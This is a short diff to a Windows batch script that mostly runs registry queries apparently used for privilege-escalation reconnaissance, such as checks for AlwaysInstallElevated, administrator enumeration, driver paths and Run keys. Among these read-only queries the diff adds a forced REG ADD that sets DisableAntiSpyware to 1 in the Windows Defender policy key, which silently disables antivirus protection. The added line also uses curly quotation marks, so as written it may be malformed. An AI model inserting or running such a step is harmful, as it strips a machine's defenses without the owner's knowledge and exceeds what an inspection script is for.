@@ -134,6 +134,8 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 ECHO ============================
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\CredUI\EnumerateAdministrators
 ECHO ============================
+REG ADD “hklm\software\policies\microsoft\windows defender” /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+ECHO ============================
 reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
 ECHO ============================
 reg Query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
